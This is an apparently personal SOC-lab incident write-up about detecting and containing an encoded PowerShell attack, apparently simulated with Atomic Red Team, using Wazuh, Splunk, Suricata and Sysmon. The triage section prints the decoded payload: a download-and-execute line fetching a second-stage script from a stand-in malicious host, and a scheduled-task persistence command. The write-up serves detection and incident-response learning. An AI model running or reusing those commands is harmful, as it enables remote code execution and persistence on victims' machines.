üîç Initial Detection

How It Started

While reviewing my Splunk dashboard during routine monitoring, I noticed an unusual spike in alerts. My Wazuh agent triggered a high-severity alert for encoded PowerShell execution on my Windows 10 lab VM.

‚ö†Ô∏è Initial Alert 
Rule ID: 91816 - PowerShell encoded command detected
Severity: High (Level 12)
Host: WIN-LAB-01 (192.168.1.150)
User: labuser
Timestamp: 2024-12-10 14:23:17 EST

Command Line:
powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...

Why This Matters

Encoded PowerShell commands are a massive red flag in SOC operations. Attackers use Base64 encoding to:

  • Evade basic string-based detection rules
  • Hide malicious payloads from event logs
  • Bypass application whitelisting
  • Execute fileless malware attacks

In my experience monitoring the Mini-SOC, I've seen legitimate PowerShell scripts, but encoded commands are almost always malicious.

üïµÔ∏è Investigation Process

T+0:00 | Initial Alert

Alert Received & Triage

Wazuh alert appeared in Splunk dashboard. I immediately stopped what I was doing and began triage. First step: decode the Base64 string to see what we're dealing with. 

# PowerShell one-liner to decode
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SQBFAFgAIAAo..."))

# Result (cleaned):
IEX (New-Object Net.WebClient).DownloadString('http://malicious[.]com/stage2.ps1')
schtasks /create /tn "SystemUpdate" /tr "powershell -File C:\Users\Public\update.ps1" /sc onlogon

My assessment: This is attempting to download a second-stage payload AND create persistence via scheduled task. Definitely malicious.

T+0:05 | Log Correlation

Correlated Events Across Systems

Jumped into Splunk to find related events. I ran this search to correlate Wazuh alerts with network traffic: 

index=suricata OR index=wazuh host="WIN-LAB-01"
| eval _time=strptime(timestamp, "%Y-%m-%dT%H:%M:%S")
| sort _time
| table _time, src_ip, dest_ip, dest_port, alert.signature, full_log

Key Findings:

  • 3 additional PowerShell executions in 2-minute window
  • Suricata detected HTTP connection to 185.220.101.42 (suspicious IP)
  • Scheduled task creation logged in Windows Event ID 4698
T+0:12 | Threat Intelligence

IOC Enrichment

Checked the destination IP using my automated threat intel bot (CyberOps Sidekick):

Threat Intel Results
  • AbuseIPDB: Score 100/100 (reported 47 times)
  • VirusTotal: 8/92 vendors flagged as malicious
  • AlienVault OTX: Associated with commodity malware campaigns
  • Domain Age: Registered 3 days ago (major red flag)

This confirmed malicious intent - not a false positive.

T+0:25 | Host Forensics

Deep Dive into Endpoint

Analyzed Windows Event Logs and Sysmon data to build the complete attack timeline:

  • Event ID 4688: Process creation for powershell.exe (parent: cmd.exe)
  • Sysmon Event ID 1: Full command line captured
  • Event ID 4698: Scheduled task "SystemUpdate" created
  • File Creation: C:\Users\Public\update.ps1 written to disk

Process Tree Analysis: The PowerShell was spawned from a user-initiated cmd.exe, which makes sense since this was a controlled lab test using Atomic Red Team.

T+0:42 | Containment

Threat Contained

Took immediate action to stop the threat:

  1. Isolated host from network (firewall block all egress except DNS)
  2. Terminated malicious powershell.exe process (PID 4892)
  3. Deleted C:\Users\Public\update.ps1
  4. Removed scheduled task "SystemUpdate"
  5. Collected forensic evidence (memory dump, logs, registry)

üìö What I Learned

What Worked Well ‚úÖ

  • Detection was fast: Wazuh caught it within seconds, alerting me before the payload could execute
  • Log correlation saved time: Having Wazuh + Suricata + Sysmon in Splunk let me build the complete picture quickly
  • Threat intel automation: My CyberOps Sidekick bot provided instant context without manual lookups
  • Documentation: I maintained detailed notes throughout, making this writeup much easier

Areas for Improvement üîß

  • Alert triage speed: Took 5 minutes to decode the PowerShell - I should automate this with a Splunk saved search
  • Playbook gaps: No pre-built response playbook for encoded PowerShell - had to improvise
  • Containment delay: Manual isolation took 15+ minutes - need SOAR integration for instant response

Immediate Actions Taken

‚úÖ Improvements Implemented
  • Created Splunk alert to auto-decode Base64 PowerShell commands
  • Built custom Suricata rule for encoded PowerShell patterns
  • Documented incident response playbook for similar scenarios
  • Added automated threat intel queries to alert workflow

‚úÖ Conclusion

This investigation demonstrated the value of having a properly configured home SOC environment. The detection worked as intended, catching a sophisticated attack technique (encoded PowerShell + scheduled task persistence) that would bypass basic antivirus.
